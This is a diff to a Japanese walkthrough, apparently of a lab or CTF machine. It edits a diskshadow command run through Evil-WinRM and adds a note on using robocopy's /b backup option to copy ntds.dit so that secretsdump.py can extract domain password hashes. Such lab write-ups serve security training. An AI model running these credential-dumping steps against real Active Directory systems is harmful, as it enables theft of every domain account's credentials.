@@ -281,7 +281,7 @@ end backupX
 次のように実行する：
 
 ```
-*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s back_script.txt
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s script.txt
 ```
 
 Eドライブ中のntds.ditをrobocopyしてやる：
@@ -301,6 +301,9 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----       10/29/2022   5:22 AM       18874368 ntds.dit
 ```
+
+> `robocopy <コピー元> <コピー先> <コピーしたいファイル名>`という書式。`/b`オプションにより、”バックアップとして”コピーという意味になる。
+> このオプションを指定しないと、Access deniedとなる。
 
 このntds.ditをKaliに送って、`secretsdump.py`を次のように実行する：
 
